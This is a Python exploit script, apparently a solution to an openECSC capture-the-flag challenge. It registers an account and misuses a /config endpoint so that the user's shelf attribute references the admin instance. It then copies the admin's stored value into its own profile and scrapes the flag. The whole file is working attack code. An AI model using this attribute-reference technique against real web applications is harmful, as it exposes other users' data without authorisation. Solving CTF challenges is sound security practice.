import requests, re
from urllib.parse import urljoin

TARGET = "https://c2e48d0a-c41a-44ab-a56a-4ee715e5d8b1.openec.sc:1337/"   
REG = "/register"
CFG = "/config"
EMPTY = "/empty"
PROFILE = "/profile"

FLAG_PAT = re.compile(r"openECSC\{.*?\}|[A-Za-z0-9_!]{8,}\{.*?\}") 

s = requests.Session()
s.headers.update({"User-Agent":"exploit-script"})

def register():
    url = urljoin(TARGET, REG)
    r = s.post(url, data={"username":"pwner","password":"pwn"}, allow_redirects=True, timeout=10)
    return r

def set_config(key, value):
    url = urljoin(TARGET, CFG)
    r = s.post(url, data={"config":key, "value":value}, allow_redirects=True, timeout=10)
    return r

def call_empty():
    url = urljoin(TARGET, EMPTY)
    r = s.post(url, allow_redirects=True, timeout=10)
    return r

def get_profile():
    url = urljoin(TARGET, PROFILE)
    r = s.get(url, timeout=10)
    return r

def find_flag(html):
    if not html:
        return None
    m = FLAG_PAT.search(html)
    if m:
        return m.group(0)
    m2 = re.search(r"\{[A-Za-z0-9_\-!]{10,}\}", html)
    if m2:
        return m2.group(0)
    return None

def main():
    print("[*] Target:", TARGET)
    print("[*] Registering user...")
    register()

    print("[*] Step 1: set alcohol_shelf => _all_instances (list of instances)")
    set_config("alcohol_shelf", "_all_instances")

    print("[*] Step 2: call /empty to set alcohol_shelf = first element (admin instance)")
    call_empty()

    print("[*] Step 3: copy preferred_beverage from alcohol_shelf (admin) into our preferred_beverage")
    set_config("preferred_beverage", "preferred_beverage")

    print("[*] Fetching /profile to look for flag...")
    r = get_profile()
    if r is None:
        print("[!] cannot fetch profile")
        return

    flag = find_flag(r.text)
    if flag:
        print("\n[+] FLAG FOUND:", flag)
        print("[+] Profile page URL:", urljoin(TARGET, PROFILE))
    else:
        print("[!] No flag found in profile HTML. Here's a snippet for debugging:\n")
        print(r.text[:1000])

if __name__ == "__main__":
    main()
